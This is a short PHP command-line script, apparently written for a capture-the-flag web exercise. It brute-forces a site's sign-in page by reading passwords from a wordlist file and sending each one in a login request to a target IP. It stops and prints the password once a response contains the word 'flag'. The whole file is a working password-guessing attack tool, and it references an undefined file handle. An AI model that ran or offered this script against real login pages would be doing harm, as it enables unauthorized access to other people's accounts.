<?php

function grep($linet, $str) {
  $line = explode(PHP_EOL,$linet);
 for ($s = 0;  count($line) > $s; $s++) {
     if (strpos($line[$s], $str) !== false) {
            return $line[$s];
        }
    }
    return -1;
}

function brutus($login, $file, $ip) {
	$a = $homepage = file_get_contents($file);
	$e =  explode("\n",$a);
	foreach ($e as &$b) {
		$url = "http://$ip/?page=signin&username=$login&password=$b&Login=Login#";
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$z = curl_exec($ch);
		$ee = $currentprofile=grep($z, "flag");
		if(curl_error($ch))
		    fwrite($fp, curl_error($ch));
		curl_close($ch);
		if ($ee != -1) {
			echo "flag=$ee\npassword=$b\nurl=$url";
			return;
		}
	}
}
brutus($argv[3], $argv[2], $argv[1]);

?>
